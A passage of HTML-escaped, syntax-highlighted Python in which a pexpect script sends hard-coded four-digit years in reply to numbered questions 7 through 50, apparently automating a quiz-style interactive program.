&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1971&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1924&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1950&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1960&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1915&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1949&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1945&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1934&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1945&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1931&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1962&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1961&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1961&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1948&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1967&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1973&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1965&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1963&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;35&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;37&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1968&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;38&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1958&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1966&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1955&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;41&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1952&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1960&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1947&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1970&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1966&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1944&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1954&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1971&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1956&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1948&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;question&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
